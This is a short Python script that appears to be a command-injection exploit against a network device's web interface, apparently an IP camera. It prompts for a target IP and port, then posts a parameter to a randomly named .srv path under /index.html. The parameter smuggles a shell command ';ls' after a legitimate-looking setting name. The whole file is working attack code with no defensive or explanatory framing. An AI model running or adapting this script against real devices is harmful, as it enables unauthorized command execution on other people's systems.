import requests
import string
import random

ip = input("IP-> ")
port = input("Port-> ")

def execute_command():
    rand_srv = ""
    for i in range(random.randint(8,42)): rand_srv = rand_srv + random.choice(string.ascii_lowercase)
    try:
        req = requests.post("http://{}:{}/index.html/{}.srv".format(ip,port,rand_srv),data={'param':'string:root.Time.DST.Enabled string:;ls'})
    except:
        print("[!] Failed to connect")
    print("http://{}:{}/index.html/{}.srv".format(ip,port,rand_srv))

execute_command()
